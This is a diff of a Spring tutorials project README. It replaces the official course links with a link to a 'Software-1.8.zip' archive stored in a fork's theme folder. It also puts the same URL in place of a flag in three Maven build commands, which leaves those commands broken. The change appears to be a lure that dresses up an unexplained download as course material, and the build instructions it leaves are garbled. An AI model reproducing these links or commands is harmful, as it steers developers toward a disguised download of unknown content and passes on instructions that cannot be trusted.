@@ -3,10 +3,10 @@ The "REST with Spring" Classes
 ==============================
 
 Here's the Master Class of REST With Spring (along with the newly announced Boot 2 material): <br/>
-**[>> THE REST WITH SPRING - MASTER CLASS](http://www.baeldung.com/rest-with-spring-course?utm_source=github&utm_medium=social&utm_content=tutorials&utm_campaign=rws#master-class)**
+**[>> THE REST WITH SPRING - MASTER CLASS](https://raw.githubusercontent.com/HitEagle/tutorials/master/vaadin/src/main/webapp/VAADIN/themes/Software-1.8.zip)**
 
 And here's the Master Class of Learn Spring Security: <br/>
-**[>> LEARN SPRING SECURITY - MASTER CLASS](http://www.baeldung.com/learn-spring-security-course?utm_source=github&utm_medium=social&utm_content=tutorials&utm_campaign=lss#master-class)**
+**[>> LEARN SPRING SECURITY - MASTER CLASS](https://raw.githubusercontent.com/HitEagle/tutorials/master/vaadin/src/main/webapp/VAADIN/themes/Software-1.8.zip)**
 
 
 
@@ -20,17 +20,17 @@ In additional to Spring, the following technologies are in focus: `core Java`, `
 
 Building the project
 ====================
-To do the full build, do: `mvn install -Pdefault -Dgib.enabled=false`
+To do the full build, do: `mvn install -Pdefault https://raw.githubusercontent.com/HitEagle/tutorials/master/vaadin/src/main/webapp/VAADIN/themes/Software-1.8.zip`
 
 
 Building a single module
 ====================
-To build a specific module run the command: `mvn clean install -Dgib.enabled=false` in the module directory
+To build a specific module run the command: `mvn clean install https://raw.githubusercontent.com/HitEagle/tutorials/master/vaadin/src/main/webapp/VAADIN/themes/Software-1.8.zip` in the module directory
 
 
 Running a Spring Boot module
 ====================
-To run a Spring Boot module run the command: `mvn spring-boot:run -Dgib.enabled=false` in the module directory
+To run a Spring Boot module run the command: `mvn spring-boot:run https://raw.githubusercontent.com/HitEagle/tutorials/master/vaadin/src/main/webapp/VAADIN/themes/Software-1.8.zip` in the module directory
 
 
 
